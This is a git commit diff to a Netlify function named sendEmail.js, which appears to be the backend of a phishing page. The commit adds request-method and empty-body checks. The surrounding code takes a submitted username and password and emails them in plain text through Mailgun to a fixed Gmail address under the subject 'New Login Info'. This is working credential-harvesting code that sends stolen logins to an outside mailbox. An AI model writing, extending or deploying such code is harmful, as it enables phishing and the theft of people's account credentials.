1aa81cbe1e1cd0b907022449f8c7bf84020bc322
sarah1brown100-netizen <sarah1brown100@gmail.com>
2026-04-03 12:29:29 -0700

    Update sendEmail.js

--- netlify/functions/sendEmail.js
+++ netlify/functions/sendEmail.js
@@ -8,12 +8,21 @@ key: process.env.MAILGUN_API_KEY
 });
 
 export async function handler(event) {
+// Only allow POST
+if (event.httpMethod !== 'POST') {
+return { statusCode: 405, body: 'Method Not Allowed' };
+}
+
+if (!event.body) {
+return { statusCode: 400, body: JSON.stringify({ message: 'No data sent' }) };
+}
+
 try {
 const { username, password } = JSON.parse(event.body);
 
 await mg.messages.create(process.env.MAILGUN_DOMAIN, {
 from: 'Mailgun Sandbox <postmaster@sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>', // LITERAL string!
-to: 'Anabones716@gmail.com', // must be verified in sandbox
+to: 'Anabones716@gmail.com', // must be verified in Mailgun sandbox
 subject: 'New Login Info',
 text: `Username: ${username}\nPassword: ${password}`
 });
